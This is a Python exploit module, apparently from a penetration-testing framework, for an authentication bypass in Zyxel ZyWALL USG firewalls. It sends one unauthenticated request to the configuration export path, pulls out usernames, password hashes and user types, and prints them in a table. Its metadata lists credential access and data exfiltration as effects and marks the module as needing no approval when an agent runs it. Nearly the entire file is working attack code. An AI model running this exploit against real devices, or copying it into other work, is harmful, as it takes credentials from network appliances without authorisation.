#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zyxel ZyWALL USG Extract Hashes"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Zyxel ZyWALL USG Extract Hashes',
        'description': 'Exploit implementation for ZyWall USG 20 Authentication Bypass In Configuration Import/Export. If the tharget is vulnerable it allows to download configuration files which contains sensitive data like password hashes, firewall rules and other network related configurations.',
        'author': ['RedTeam Pentesting'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/17244/'],
        'tags': ['iot', 'router', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(443, "Target HTTP port")
    ssl = OptBool(True, "SSL enabled: true/false")

    def run(self):
        self.credentials = []

        if self.check():
            print_success("Target appears to be vulnerable")
            print_table(("Username", "Hash", "User type"), *self.credentials)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):  # todo: requires improvement
        path = "/cgi-bin/export-cgi/images/?category={}&arg0={}".format('config', 'startup-config.conf')
        response = self.http_request(
            method="GET",
            path=path
        )

        if response is not None and response.status_code == 200:
            for line in response.text.split("\n"):
                line = line.strip()
                m_groups = re.match(r"username (.*) password (.*) user-type (.*)", line, re.I | re.M)
                if m_groups:
                    self.credentials.append((m_groups.group(1), m_groups.group(2), m_groups.group(3)))

            if self.credentials:
                return True  # target is vulnerable

        return False  # target is not vulnerable
